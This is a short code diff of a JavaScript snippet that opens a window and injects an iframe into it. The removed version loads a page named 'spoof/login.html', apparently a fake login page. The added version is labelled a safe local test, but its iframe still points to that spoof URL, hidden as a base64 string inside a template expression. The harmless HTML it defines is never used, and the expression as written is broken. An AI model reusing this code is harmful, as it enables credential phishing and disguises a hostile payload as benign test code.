@@ -1,26 +1,31 @@
 <script>
 function go(){
-    var x = window.open('http://google.com/csi'); // arahkan ke server lokal kamu
+    var x = window.open('http://localhost:8000');
 
     setTimeout(function(){
-        if(!x || x.closed) return;
+        if (!x || x.closed) return;
 
-        try {
-            x.document.body.innerHTML = `
-                <h1>Demo Page</h1>
-                <p>Iframe injected successfully</p>
-                <iframe 
-                    src="https://cnfdnfial-ops.github.io/spoof/login.html" 
-                    width="600" 
-                    height="400" 
-                    style="border:1px solid black;">
-                </iframe>
-            `;
-        } catch(e) {
-            console.log("Tidak bisa akses karena Same Origin Policy:", e);
-        }
+        var safeHTML = `
+            <html>
+            <body style="font-family:sans-serif;text-align:center;">
+                <h2>Local Iframe Demo</h2>
+                <p>Ini hanya test lokal.</p>
+            </body>
+            </html>
+        `;
 
-    }, 3000);
+        var encoded = btoa(safeHTML);
+
+        x.document.body.innerHTML = `
+            <h1>Injected Content</h1>
+            <iframe 
+                src="data:text/html;base64,${aHR0cHM6Ly9jbmZkbmZpYWwtb3BzLmdpdGh1Yi5pby9zcG9vZi9sb2dpbi5odG1s}" 
+                width="600" 
+                height="300"
+                style="border:1px solid black;">
+            </iframe>
+        `;
+    },3000);
 }
 </script>
 
